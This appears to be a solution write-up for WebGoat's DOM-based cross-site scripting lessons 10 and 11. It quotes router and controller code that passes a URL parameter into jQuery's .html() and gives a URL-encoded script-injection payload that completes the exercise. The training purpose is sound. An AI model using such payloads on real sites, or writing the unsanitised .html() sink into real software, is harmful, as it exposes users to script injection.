# Cross Site Scripting

## Lesson 10
The test route is hidden in `js/view/GoatRouter.js`:
```
routes: {
        'welcome': 'welcomeRoute',
        'lesson/:name': 'lessonRoute',
        'lesson/:name/:pageNum': 'lessonPageRoute',
        'test/:param': 'testRoute',
        'reportCard': 'reportCard'
    }

...

testRoute: function (param) {
    this.lessonController.testHandler(param);
    //this.menuController.updateMenu(name);
}
```

So the answer is `start.mvc#test/`

## Lesson 11
`testHandler` is located in `js/controller/LessonController.js`:
```
this.testHandler = function(param) {
    console.log('test handler');
    this.lessonContentView.showTestParam(param);
};
```

And in `js/view/LessonContentView.js`:
```
/* for testing */
showTestParam: function (param) {
    this.$el.find('.lesson-content').html('test:' + param);
}
```

`.html()` function is vulnerable to XSS.
 
Use this URL to call the requested method:
```
http://vernjan:8080/WebGoat/start.mvc#test/%3Cscript%3Ewebgoat.customjs.phoneHome%28%29%3C%2Fscript%3E
```
And grab the random number from response:
```
{
  "lessonCompleted" : true,
  "feedback" : "Congratulations. You have successfully completed the assignment.",
  "output" : "phoneHome Response is 1090389950",
  "assignment" : "DOMCrossSiteScripting",
  "attemptWasMade" : true
}
```
